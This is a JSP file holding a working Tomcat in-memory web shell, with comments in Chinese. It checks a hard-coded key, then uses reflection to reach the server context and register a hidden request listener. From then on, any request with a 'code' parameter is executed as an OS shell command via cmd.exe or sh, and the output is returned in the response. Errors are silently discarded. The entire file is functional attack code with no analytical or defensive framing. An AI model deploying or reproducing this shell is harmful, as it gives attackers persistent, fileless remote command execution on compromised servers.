<%@ page import="java.lang.reflect.*, javax.servlet.*, java.util.*, java.io.*" %>
<%@ page language="java" pageEncoding="utf-8" contentType="text/html; charset=UTF-8"%>

<%
    request.setCharacterEncoding("UTF-8");
    response.setCharacterEncoding("UTF-8");
    response.setContentType("text/html; charset=UTF-8");
%>
<%
    String key = request.getParameter("key");
    if(!"yourSecretKey123".equals(key)){
        response.sendError(404);
        return;
    }
    try {
        // 通过反射获取StandardContext
        ServletContext servletContext = application;
        Field appContextField = servletContext.getClass().getDeclaredField("context");
        appContextField.setAccessible(true);
        Object appContext = appContextField.get(servletContext);

        Field stdContextField = appContext.getClass().getDeclaredField("context");
        stdContextField.setAccessible(true);
        Object stdContext = stdContextField.get(appContext);

        // 动态注册Listener
        Method addListener = stdContext.getClass().getMethod("addApplicationEventListener", Object.class);
        addListener.invoke(stdContext, new EvilListener());

        out.println("[+] 内存马注入成功");
    } catch(Exception e) {
        out.println("[-] 错误: " + e.toString());
    }
%>

<%!
    // 修正后的Listener实现
    public class EvilListener implements ServletRequestListener {
        private final String TRIGGER_PARAM = "code";

        public void requestInitialized(ServletRequestEvent sre) {
            try {
                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                String cmd = req.getParameter(TRIGGER_PARAM);

                if(cmd != null && !cmd.isEmpty()) {
                    // 创建异步上下文获取Response
                    AsyncContext asyncContext = req.startAsync();
                    ServletResponse response = asyncContext.getResponse();
                    response.setContentType("text/html");

                    // 执行命令
                    String[] execCmd = System.getProperty("os.name").toLowerCase().contains("win")
                            ? new String[]{"cmd.exe","/c", cmd}
                            : new String[]{"sh","-c", cmd};

                    InputStream in = Runtime.getRuntime().exec(execCmd).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");

                    // 输出结果
                    PrintWriter out = response.getWriter();
                    out.print(s.hasNext() ? s.next() : "");
                    out.flush();

                    asyncContext.complete(); // 必须完成异步上下文
                }
            } catch (Exception e) {/* 静默处理 */}
        }

        public void requestDestroyed(ServletRequestEvent sre) {}
    }
%>